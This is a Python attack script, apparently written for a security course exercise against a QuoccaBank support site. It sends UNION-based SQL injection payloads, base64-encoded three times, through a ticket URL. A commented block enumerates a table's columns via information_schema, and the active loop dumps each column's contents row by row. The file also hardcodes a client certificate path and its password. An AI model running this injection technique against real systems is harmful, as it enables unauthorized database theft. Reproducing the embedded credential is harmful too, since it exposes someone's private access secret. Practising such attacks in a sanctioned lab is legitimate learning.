import base64
from requests_pkcs12 import get

url = "https://support-v3.quoccabank.com/raw/"
p12_path = "/Users/bryanle/Downloads/z5361001.p12"
p12_password = "Qs3/Keg5W3D/kSJJfp9ltw=="

headers = {
    'Host': 'support-v3.quoccabank.com',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i'
}

# offset = 0
# while offset < 1000:
#     sqli = f"' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='funny_meme_table_name' LIMIT 1 OFFSET {offset}; -- "
#     encoded = base64.b64encode(sqli.encode())
#     encoded = base64.b64encode(encoded)
#     encoded = base64.b64encode(encoded)
#     encoded_ticket = encoded.decode("utf-8")
#     response = get(
#         url + encoded_ticket,
#         headers=headers,
#         pkcs12_filename=p12_path,
#         pkcs12_password=p12_password
#     )
#     if "Ticket not found" in response.text:
#         print("THATS IT")
#         break
#     print(response.text)
#     offset += 1
column_names = ["cache_invalidation", "guessable_field", "id", "unguessable_field"]
for column_name in column_names:
    offset = 0
    while True:
        sqli = f"' UNION SELECT 1, {column_name} FROM funny_meme_table_name LIMIT 1 OFFSET {offset}; -- "
        encoded = base64.b64encode(sqli.encode())
        encoded = base64.b64encode(encoded)
        encoded = base64.b64encode(encoded)
        encoded_ticket = encoded.decode("utf-8")
        response = get(
            url + encoded_ticket,
            headers=headers,
            pkcs12_filename=p12_path,
            pkcs12_password=p12_password
        )
        if "Ticket not found" in response.text:
            break
        print(f"{column_name} - {response.text}")
        offset += 1